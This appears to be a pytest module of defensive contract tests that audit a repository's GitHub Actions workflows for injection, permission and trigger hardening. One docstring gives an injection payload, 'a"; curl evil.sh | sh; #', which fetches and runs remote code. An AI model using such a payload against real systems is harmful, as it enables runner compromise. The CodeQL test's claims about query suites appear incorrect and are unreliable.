    the exact silent-regression class these contract tests exist to catch, so
    the comparison is set equality in both directions rather than a subset
    check that would tolerate a stale id.

    ``if: always()`` belongs to the same contract. GitHub reports a *skipped*
    job as a successful required check, so without it a cancelled run reports
    the gate itself as skipped -- that is, passing -- and broken code merges.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    catalogue: dict[Path, dict[str, dict[object, object]]] = {}
    owners: list[tuple[Path, str]] = []
    for path in _workflow_paths(repo_root):
        jobs = _workflow_jobs(_load_workflow(path), path)
        catalogue[path] = jobs
        owners.extend(
            (path, job_id)
            for job_id, job in jobs.items()
            if job.get("name") == REQUIRED_STATUS_CHECK_NAME
        )

    assert owners, (
        f"no job named {REQUIRED_STATUS_CHECK_NAME!r} exists in any workflow "
        f"under {WORKFLOWS_DIR}. The branch ruleset gates merges on that exact "
        "name, so without it the repository has no enforced status check"
    )
    assert len(owners) == 1, (
        f"expected exactly one job named {REQUIRED_STATUS_CHECK_NAME!r}, found "
        f"{[f'{path.name}:{job_id}' for path, job_id in owners]}"
    )

    gate_path, gate_id = owners[0]
    gate_job = catalogue[gate_path][gate_id]
    expected = set(catalogue[gate_path]) - {gate_id}
    needed = _needed_job_ids(gate_job.get("needs"))

    missing = sorted(expected - needed)
    assert not missing, (
        f"job {gate_id!r} in {gate_path} does not depend on {missing}, so those "
        f"jobs no longer gate merges. {REQUIRED_STATUS_CHECK_NAME!r} is the only "
        "required check, and it succeeds whenever every job in its `needs` list "
        "succeeded, so a job absent from that list is invisible: it can fail, be "
        "cancelled, or be dropped, and the gate stays green. Add the ids to "
        f"{REQUIRED_STATUS_CHECK_NAME!r}.needs and forward their `result`"
    )

    extra = sorted(needed - expected)
    assert not extra, (
        f"job {gate_id!r} in {gate_path} depends on {extra}, which is not a job "
        f"declared in that file. The file declares "
        f"{sorted(catalogue[gate_path])}; `needs` must name existing jobs only"
    )

    condition = _normalise_expression(str(gate_job.get("if", "")))
    assert condition == ALWAYS_CONDITION, (
        f"job {gate_id!r} in {gate_path} declares if: {condition!r} rather than "
        f"{ALWAYS_CONDITION!r}. GitHub treats a skipped job as a *successful* "
        "required check, so a cancelled run would report the gate itself as "
        "skipped -- that is, passing -- and broken code would merge. Without "
        "this condition the gate silently stops gating exactly when a run is "
        "cancelled, which is when it matters most"
    )


def test_every_workflow_declares_on_permissions_and_concurrency(
    repo_root: Path,
) -> None:
    """Assert each workflow declares its trigger, permissions and concurrency.

    An absent ``permissions`` block means the workflow silently inherits
    whatever the repository-wide default happens to be. If that default is later
    loosened to ``write-all``, every job in every workflow gains write scope
    without a single line changing, and the workflow that least deserves it
    becomes the workflow that can push to the default branch. An absent
    ``concurrency`` block means superseded runs are not cancelled, so a rapid
    push sequence burns runner minutes re-testing commits that are already
    obsolete and the queue of stale runs reports stale results.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    for path in _workflow_paths(repo_root):
        relative = path.relative_to(repo_root)
        data = _load_workflow(path)

        assert _trigger_value(data), (
            f"{relative} declares no truthy `on:` key, so the workflow is "
            "unreachable and every job in it is dead configuration"
        )
        assert "permissions" in data, (
            f"{relative} declares no workflow-level `permissions:` block, so it "
            "silently inherits the repository default. If that default is ever "
            "loosened, this workflow's token scope changes without any line "
            "here changing; declare `contents: read` explicitly"
        )
        assert "concurrency" in data, (
            f"{relative} declares no `concurrency:` block, so superseded runs "
            "are not cancelled. Each new push leaves the previous run burning "
            "runner minutes to produce a verdict about a commit nobody will "
            "ship; add a `group` keyed on head_ref or run_id and set "
            "`cancel-in-progress: true`"
        )


def test_detect_changes_path_filters_cover_the_guarded_directories(
    repo_root: Path,
) -> None:
    """Assert the ``paths-filter`` config covers the paths it claims to guard.

    The ``CI Status`` gate is fail-closed, so an under-specified filter does
    not merely save time, it skips exactly the jobs that should have run. The
    sharpest instance is a dependency or tooling change that is not a ``.py``
    file: edit ``pyproject.toml`` or ``uv.lock`` without listing it under
    ``python``, and the Python jobs never start, the gate reads their absence
    as a legitimate skip, and a broken manifest merges behind green CI. The
    same argument applies to ``.github/workflows/*.yml`` under ``workflows``,
    where a typo'd extension would unguard every workflow edit.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    blocks = _paths_filter_blocks(repo_root)
    assert blocks, (
        f"no workflow under {WORKFLOWS_DIR} runs the {PATHS_FILTER_ACTION} step, "
        "so no path filter exists and every downstream job is gated on a "
        "convention nothing declares"
    )

    for site, parsed in blocks:
        assert isinstance(parsed, dict), (
            f"{site} has a `filters:` string that does not decode to a mapping "
            f"(got {type(parsed).__name__})"
        )
        names = {str(key) for key in parsed}
        assert names == EXPECTED_PATH_FILTERS, (
            f"{site} declares filters {sorted(names)}, expected exactly "
            f"{sorted(EXPECTED_PATH_FILTERS)}. Each named filter must match a "
            "job's `needs.detect-changes.outputs` reference, so a renamed or "
            "dropped filter leaves that job's condition permanently false and "
            "the job silently skipped"
        )

        python_paths = _filter_paths(parsed, "python")
        for required in REQUIRED_PYTHON_FILTER_PATHS:
            assert required in python_paths, (
                f"{site} does not list {required!r} under the `python` filter "
                f"(declared: {sorted(python_paths)}). A dependency or config "
                "change that is not a .py file would leave the Python jobs "
                "untriggered, and the fail-closed CI Status gate would read that "
                "skip as a pass"
            )

        workflows_paths = _filter_paths(parsed, "workflows")
        assert REQUIRED_WORKFLOWS_FILTER_PATH in workflows_paths, (
            f"{site} does not list {REQUIRED_WORKFLOWS_FILTER_PATH!r} under the "
            f"`workflows` filter (declared: {sorted(workflows_paths)}), so a "
            "workflow edit would not trigger the actionlint job that guards it"
        )


def test_no_untrusted_input_is_interpolated_into_run_blocks(repo_root: Path) -> None:
    """Assert no ``run:`` body interpolates ``${{ ... }}``.

    GitHub's own hardening guide requires untrusted input to reach a shell
    through ``env``, never through interpolation into the script text. A
    ``run:`` body is evaluated as a shell script, so writing
    ``${{ github.event.pull_request.title }}`` into one hands an
    attacker-controlled string to the shell verbatim, and a PR titled
    ``a"; curl evil.sh | sh; #`` executes on the runner. Passing the value
    through ``env`` and quoting it as ``"$PR_TITLE"`` makes the same string
    data instead of code.

    This is the highest-value attack surface in the repository, because the
    dependabot auto-merge workflow runs with write permissions: an injection
    there is not a red build but a push to the default branch.

    The assertion set is deliberately layered. The first check names the steps
    that carry both ``run:`` and ``env:``, because those are the ones where an
    expression was most likely to have been "helpfully" inlined and the failure
    needs a targeted message. The set-wide scan is what generalises: it also
    catches a ``run:`` with no ``env:`` block, and it catches untrusted input
    interpolated into a step ``name:``, an ``if:``, or a ``with:`` input, none
    of which is an ``env:`` mapping.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    sites: list[tuple[str, str, bool]] = []
    env_and_run: list[str] = []
    for path in _workflow_paths(repo_root):
        relative = path.relative_to(repo_root)
        data = _load_workflow(path)
        sites.extend(
            (f"{relative}::{loc}", text, in_env)
            for loc, text, in_env in _interpolation_sites(data, "", in_env=False)
        )
        for job_id, job in _workflow_jobs(data, path).items():
            for index, step in enumerate(_job_steps(job)):
                if RUN_KEY not in step or ENV_KEY not in step:
                    continue
                run_text = step[RUN_KEY]
                if isinstance(run_text, str) and WORKFLOW_EXPRESSION_RE.search(
                    run_text
                ):
                    env_and_run.append(f"{relative}::{job_id}::step[{index}]")

    assert sites, (
        f"no `${{{{ ... }}}}` expression was found in any workflow under "
        f"{WORKFLOWS_DIR}, so this scan is inspecting nothing. Every run that "
        "needs a matrix value or a step output interpolates one; if that is no "
        "longer true, this test should be deleted rather than left vacuous"
    )
    assert not env_and_run, (
        f"these steps carry both `run:` and `env:`, yet their `run:` body "
        f"interpolates an expression: {env_and_run}. A `run:` body is evaluated "
        "as a shell script, so a `${{ github.event.pull_request.* }}` inlined "
        "there turns an attacker-controlled branch name or PR title into command "
        "injection. Move the value into the step's `env:` block and quote the "
        'shell variable, e.g. `run: echo "$PR_TITLE"`'
    )

    run_sites: list[str] = []
    untrusted_outside_env: list[str] = []
    for site, text, in_env in sites:
        if site.endswith(RUN_SUFFIX):
            run_sites.append(site)
        if not in_env and UNTRUSTED_INPUT_RE.search(text):
            untrusted_outside_env.append(site)

    assert not run_sites, (
        f"these `run:` bodies interpolate an expression: {run_sites}. This is "
        "the set-wide form of the check above and also covers steps that have no "
        "`env:` block at all, where there is nowhere to move the value to yet"
    )
    assert not untrusted_outside_env, (
        "untrusted input is interpolated outside an `env:` mapping at "
        f"{untrusted_outside_env}. `github.event.pull_request.*` and "
        "`github.event.issue.*` are fully attacker-controlled, so they must "
        "reach a shell only through an `env:` mapping, never inline in a "
        "script, a step name, a condition, or a `with:` input"
    )


def test_scheduled_security_workflows_get_their_own_concurrency_group(
    repo_root: Path,
) -> None:
    """Assert each scheduled security scan runs in a concurrency group of its own.

    ``cancel-in-progress`` is evaluated on the *arriving* run, not the one
    already queued. A scheduled CodeQL or Scorecard scan that shares a group
    with ordinary pushes is therefore killed by the next push that lands while
    it is still running -- and because the kill looks exactly like any other
    cancellation, nothing reports it. A security scan that silently never
    completes is worse than one that fails, because a failure at least appears
    in the Security tab. Both scans exist to surface findings from newly
    released rules against a codebase nobody is currently changing, which is
    precisely the situation where no push arrives to cancel them by accident and
    precisely the situation where a missed run goes unnoticed for a week.

    So the group must carry a distinct suffix for scheduled runs, and
    ``cancel-in-progress`` must be a *string expression* rather than the bare
    boolean ``true``: a bare ``true`` cancels the scheduled scan too, because it
    cancels whatever is in the group whenever anything new arrives.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    scheduled: dict[Path, dict[object, object]] = {}
    dropped: list[str] = []
    for path in _workflow_paths(repo_root):
        relative = path.relative_to(repo_root)
        data = _load_workflow(path)
        if SCHEDULE_LITERAL in _trigger_keys(data):
            scheduled[relative] = data
        elif relative.name in SCHEDULED_SECURITY_WORKFLOW_FILES:
            dropped.append(str(relative))

    assert scheduled, (
        f"no workflow under {WORKFLOWS_DIR} declares a `{SCHEDULE_LITERAL}:` "
        "trigger, so this scan is inspecting nothing. A scheduled run is the "
        "only way findings from newly released rules reach a codebase that is "
        "not currently being changed"
    )
    assert not dropped, (
        f"{dropped} no longer declares a `{SCHEDULE_LITERAL}:` trigger. Those are "
        "the weekly security scans, and the trigger is the only thing that runs "
        "them in a quiet week; without it their findings age out of the Security "
        "tab unnoticed"
    )

    shared_group: list[str] = []
    boolean_cancel: list[str] = []
    for relative, data in scheduled.items():
        concurrency = _as_mapping(
            data.get("concurrency"), f"`concurrency:` in {relative}"
        )
        group = str(concurrency.get("group", ""))
        if SCHEDULE_LITERAL not in group:
            shared_group.append(f"{relative}: group is {group!r}")
        cancel = concurrency.get("cancel-in-progress")
        if not isinstance(cancel, str) or EVENT_NAME_REFERENCE not in cancel:
            boolean_cancel.append(f"{relative}: cancel-in-progress is {cancel!r}")

    assert not shared_group, (
        "these scheduled workflows name no schedule-specific concurrency group:\n"
        + "\n".join(shared_group)
        + "\nAppend a conditional suffix keyed on "
        f"`github.event_name == '{SCHEDULE_LITERAL}'`, so a scheduled run lands "
        "in a group ordinary pushes never join"
    )
    assert not boolean_cancel, (
        "these scheduled workflows set a non-conditional `cancel-in-progress`:\n"
        + "\n".join(boolean_cancel)
        + "\n`cancel-in-progress` must be a string expression referencing "
        f"{EVENT_NAME_REFERENCE} so a scheduled run is never cancelled by a later "
        f"push, e.g. `${{{{ {EVENT_NAME_REFERENCE} != '{SCHEDULE_LITERAL}' }}}}`"
    )


def test_sarif_is_never_uploaded_from_a_pull_request_run(repo_root: Path) -> None:
    """Assert no SARIF upload can fire during a pull-request run.

    Scorecard's ``pull_request`` support is experimental and runs local-only, as
    ``supply-chain/local``. That result omits the ``branch-protection`` and
    ``online-scm`` categories that the default-branch run produces, so uploading
    it overwrites the default-branch baseline with a strictly weaker analysis and
    emits a "configurations not found" code-scanning warning on every pull
    request. A warning that appears on every PR trains reviewers to ignore
    code-scanning warnings -- which is the exact failure mode Scorecard exists to
    reduce.

    ``scorecard.yml`` carries no ``pull_request`` trigger at all today, so the
    per-step guard cannot fire yet. It is asserted anyway, together with the
    workflow-level rule, so that re-adding a PR trigger later cannot silently
    start overwriting the baseline: the trigger check fires immediately, and the
    step guard is already in place when it does.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    uploads: list[tuple[str, str]] = []
    for path in _workflow_paths(repo_root):
        for site, step in _step_sites(_load_workflow(path), path):
            if not _references_action(_step_uses(step), CODEQL_UPLOAD_SARIF_ACTION):
                continue
            condition = _normalise_expression(str(step.get("if", "")))
            uploads.append((site, condition))

    assert uploads, (
        f"no step uses {CODEQL_UPLOAD_SARIF_ACTION} in any workflow under "
        f"{WORKFLOWS_DIR}, so this scan is inspecting nothing. Uploading SARIF is "
        "how findings reach the Security tab; if that stopped happening the "
        "workflows are producing analysis nobody ever reads, and this test should "
        "be deleted rather than left vacuous"
    )

    unguarded = [
        f"{site} (if: {condition!r})"
        for site, condition in uploads
        if not _excludes_pull_request(condition)
    ]
    assert not unguarded, (
        "these SARIF upload steps are reachable from a pull-request run:\n"
        + "\n".join(unguarded)
        + "\nGive each an `if:` that names and negates the event, e.g. "
        f"`if: {EVENT_NAME_REFERENCE} != '{PULL_REQUEST_TRIGGER}'`. A "
        "`supply-chain/local` result from a pull request lacks the "
        "`branch-protection` and `online-scm` categories, so publishing it "
        "replaces the default-branch baseline with a weaker one and raises a "
        '"configurations not found" warning on every PR'
    )

    bare: list[str] = []
    both: list[str] = []
    for path in _workflow_paths(repo_root):
        data = _load_workflow(path)
        if not _has_bare_trigger(data, PULL_REQUEST_TRIGGER):
            continue
        relative = str(path.relative_to(repo_root))
        bare.append(relative)
        publishers = [
            site for site, step in _step_sites(data, path) if _publishes_sarif(step)
        ]
        if publishers:
            both.append(f"{relative}: {publishers}")

    assert bare, (
        f"no workflow under {WORKFLOWS_DIR} declares a bare `{PULL_REQUEST_TRIGGER}:` "
        "trigger, so the workflow-level check below cannot fire. A bare trigger is "
        "the risky shape -- it fires on pull requests from any branch, including "
        "forks -- and it is what makes an unguarded SARIF upload reachable"
    )
    assert not both, (
        "these workflows combine a bare pull-request trigger with a SARIF upload:\n"
        + "\n".join(both)
        + "\nQualify the trigger (for example with a `branches:` list) so fork "
        "pull requests cannot reach the code-scanning API, or drop the trigger. "
        "`github/codeql-action/analyze` counts as a SARIF upload because it "
        "publishes findings as its final act"
    )


def test_deny_all_permissions_convention_is_not_weakened(repo_root: Path) -> None:
    """Assert the deny-all default and its per-job replacement are both intact.

    ``zizmor.yml`` sets workflow-level ``permissions: {}``, which denies every
    scope and then re-grants only what each job declares. A workflow-level
    ``permissions: write-all`` hands every job in the file full write access to
    the repository -- including a job added six months from now that nobody
    reviewed in the context of a workflow-level grant, because the grant was
    already there. The blast radius of a compromise in that file would be the
    default branch rather than one analysis job.

    The per-job block is the other half. Deny-all plus no job-level permissions
    means the ``zizmor`` job cannot upload its findings at all: the run goes
    green, the Security tab goes stale, and nothing fails.

    The repo-wide sweep is checked for reachability rather than for a non-empty
    input, because a counter there would be dead code: the only way to empty it
    is to drop ``permissions:`` from every file, and
    ``test_every_workflow_declares_on_permissions_and_concurrency`` already
    asserts each file declares one, while this test's own deny-all assertion
    fires first for ``zizmor.yml``. Reachability is proved by setting
    ``write-all`` on a workflow other than ``zizmor.yml``.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    zizmor_path = repo_root / WORKFLOWS_DIR / ZIZMOR_WORKFLOW_FILE
    assert zizmor_path.is_file(), f"required gating file is missing: {zizmor_path}"

    top_level = _load_workflow(zizmor_path).get("permissions")
    assert isinstance(top_level, dict), (
        f"{ZIZMOR_WORKFLOW_FILE} declares workflow-level `permissions: "
        f"{top_level!r}` ({type(top_level).__name__}), which is not the deny-all "
        f"`{{}}`. The empty mapping is the whole point of the convention: it denies "
        "every scope so each job grants only what it needs, and it stops a job "
        "added later from inheriting write access to the repository"
    )
    assert not top_level, (
        f"{ZIZMOR_WORKFLOW_FILE} declares workflow-level `permissions: "
        f"{top_level!r}` rather than the deny-all `{{}}`. Any scope named there is "
        f"granted to every job in the file, and `{WRITE_ALL_PERMISSIONS}` in "
        "particular hands full write access to the repository to a job added later "
        "that nobody reviewed"
    )

    jobs = _workflow_jobs(_load_workflow(zizmor_path), zizmor_path)
    assert ZIZMOR_JOB_ID in jobs, (
        f"{ZIZMOR_WORKFLOW_FILE} declares no job named {ZIZMOR_JOB_ID!r} (it "
        f"declares {sorted(jobs)}), so the per-job permissions that replace the "
        "deny-all default cannot be checked"
    )
    granted = _as_mapping(
        jobs[ZIZMOR_JOB_ID].get("permissions"),
        f"`permissions:` of the {ZIZMOR_JOB_ID!r} job in {ZIZMOR_WORKFLOW_FILE}",
    )
    missing = {
        scope: value
        for scope, value in REQUIRED_ZIZMOR_JOB_PERMISSIONS.items()
        if granted.get(scope) != value
    }
    assert not missing, (
        f"the {ZIZMOR_JOB_ID!r} job in {ZIZMOR_WORKFLOW_FILE} does not declare "
        f"{missing} (it declares {dict(granted)!r}). With deny-all at the workflow "
        "level, the job-level block is the only thing granting these scopes, so "
        "without them the SARIF upload is rejected, the run still goes green, and "
        "the Security tab silently goes stale"
    )

    # This sweep is exhaustive over every workflow, so it cannot be vacuous:
    # `_workflow_paths` already asserts the directory is non-empty, and
    # `test_every_workflow_declares_on_permissions_and_concurrency` already
    # asserts that *every* one of those files declares a `permissions` key. An
    # anti-vacuity counter here would therefore be dead code -- the only way to
    # empty it is to drop the key from every file, which trips that sibling
    # test first.
    write_all: list[str] = []
    for path in _workflow_paths(repo_root):
        data = _load_workflow(path)
        if data.get("permissions") == WRITE_ALL_PERMISSIONS:
            write_all.append(str(path.relative_to(repo_root)))
    assert not write_all, (
        f"{write_all} declare a workflow-level `permissions: "
        f"{WRITE_ALL_PERMISSIONS}`. That grants every scope to every job in the "
        "file, so a job added later inherits full write access to the repository "
        "without anyone reviewing the grant. Use `permissions: {}` and declare "
        "only the scopes each job needs"
    )


def test_privileged_triggers_never_check_out_code(repo_root: Path) -> None:
    """Assert write-token triggers are paired with an explicit audit marker.

    ``pull_request_target`` and ``workflow_run`` both run with a write token
    against code an attacker can influence: the first against the contents of a
    pull request, the second against whatever the named upstream workflow
    produced. They are safe only while untrusted code is never executed, which
    means never checked out, never built, and never tested. A single checkout
    plus a build step in such a workflow is remote code execution with a push
    token, and it produces no visible symptom until the push lands.

    The `# zizmor: ignore[dangerous-triggers]` comment is the audit trail. It is
    asserted against the raw line because parsing discards it, and because the
    comment is what forces a reviewer to read this exact reasoning before adding
    a step -- the finding zizmor raises is the thing the comment has to answer
    for, so dropping the comment drops the record of having answered it.

    This is defence in depth for the dependabot auto-merge workflow being added
    next, which also contains no checkout.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    assignee = repo_root / WORKFLOWS_DIR / DEFAULT_ASSIGNEE_WORKFLOW_FILE
    assert assignee.is_file(), f"required gating file is missing: {assignee}"
    assert not _checkout_sites(_load_workflow(assignee), assignee), (
        f"{DEFAULT_ASSIGNEE_WORKFLOW_FILE} contains an `{CHECKOUT_ACTION}` step at "
        f"{_checkout_sites(_load_workflow(assignee), assignee)}. That file runs on "
        "`pull_request_target` and `workflow_run`, both of which carry a write "
        "token against attacker-influenceable code. Checking it out hands the "
        "contents of a pull request to a job that can push, and any build or test "
        "step after the checkout executes it"
    )

    seen: set[str] = set()
    privileged_checkout: list[str] = []
    uncommented: list[str] = []
    for path in _workflow_paths(repo_root):
        data = _load_workflow(path)
        declared = _trigger_keys(data) & DANGEROUS_TRIGGERS
        seen |= declared
        if not declared:
            continue
        relative = str(path.relative_to(repo_root))
        privileged_checkout.extend(
            f"{site} ({relative})" for site in _checkout_sites(data, path)
        )
        source = _trigger_source_lines(path, declared)
        uncommented.extend(
            f"{relative}: {name!r} declared as {source.get(name, '<not found>')!r}"
            for name in sorted(declared)
            if ZIZMOR_DANGEROUS_TRIGGERS_COMMENT not in source.get(name, "")
        )

    assert seen, (
        f"no workflow under {WORKFLOWS_DIR} declares any of "
        f"{sorted(DANGEROUS_TRIGGERS)}, so this scan is inspecting nothing. Those "
        "are the only two events that run with a write token against code an "
        "attacker can influence, and the rules the no-checkout assertion and the "
        "comment requirement enforce are exactly the ones that keep them safe"
    )
    assert not privileged_checkout, (
        "workflows that combine a write-token trigger with a working-tree checkout:\n"
        + "\n".join(privileged_checkout)
        + "\nRemove the checkout. A checkout in a `pull_request_target` or "
        "`workflow_run` workflow places attacker-influenceable code on a runner "
        "holding a write token, and any later build or test step executes it"
    )
    assert not uncommented, (
        "privileged trigger keys with no audit comment on the same line:\n"
        + "\n".join(uncommented)
        + f"\nEach must carry `# {ZIZMOR_DANGEROUS_TRIGGERS_COMMENT}` so the "
        "deliberate, reviewed decision to run with a write token against "
        "untrusted input stays legible in the diff. zizmor's `dangerous-triggers` "
        "audit flags exactly these events, and the comment is the record of having "
        "answered it"
    )


def test_codeql_covers_python_and_the_workflows(repo_root: Path) -> None:
    """Assert CodeQL analyses both Python and the workflow files themselves.

    Without the ``actions`` language the ``.github/workflows/*.yml`` files are
    never scanned, and in this repository they are the highest-value attack
    surface available: ``default-assignee.yml`` runs with a write token on a
    privileged trigger, so an injected action ref or a shell injection in that
    file is worth more than anything in ``src/``. The matrix is therefore
    asserted as exactly ``{python, actions}`` -- a set comparison, so a fourth
    language is as much a failure as a missing one, because an unasserted entry
    is an unreviewed one.

    ``queries: security-extended`` is the same argument one level down:
    ``security-and-quality`` is CodeQL's *default* suite, so leaving ``queries:``
    unset looks like a deliberate choice while silently running the weaker
    configuration. Asserting the literal, rather than merely asserting the key
    exists, is what makes the default an error.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    codeql_path = repo_root / WORKFLOWS_DIR / CODEQL_WORKFLOW_FILE
    assert codeql_path.is_file(), f"required gating file is missing: {codeql_path}"

    data = _load_workflow(codeql_path)
    languages = _matrix_languages(data, codeql_path)
    assert languages, (
        f"{CODEQL_WORKFLOW_FILE} declares no `strategy.matrix.include` entry with a "
        "`language:` key, so this scan is inspecting nothing and a matrix that "
        "silently stopped analysing anything would pass"
    )
    assert languages == REQUIRED_CODEQL_LANGUAGES, (
        f"{CODEQL_WORKFLOW_FILE} analyses {sorted(languages)}, expected exactly "
        f"{sorted(REQUIRED_CODEQL_LANGUAGES)}. Without `actions` the workflow files "
        "are unscanned, and here they are the highest-value target because a "
        "privileged write-token workflow lives in that directory"
    )

    suites = _init_query_suites(data, codeql_path)
    assert suites, (
        f"no `{CODEQL_INIT_ACTION}` step in {CODEQL_WORKFLOW_FILE} sets `queries:` "
        "in its `with:` block, so the analysis runs on CodeQL's default suite. "
        f"The default is `security-and-quality`, which is weaker than "
        f"`{REQUIRED_CODEQL_QUERY_SUITE}` and does not satisfy this contract"
    )
    wrong = [repr(suite) for suite in suites if suite != REQUIRED_CODEQL_QUERY_SUITE]
    assert not wrong, (
        f"{CODEQL_WORKFLOW_FILE} sets `queries: {wrong}` but the required suite is "
        f"`{REQUIRED_CODEQL_QUERY_SUITE}`. `security-and-quality` is CodeQL's "
        "default suite, so falling back to it looks like a deliberate narrower "
        "choice while actually just being the unset default"
    )
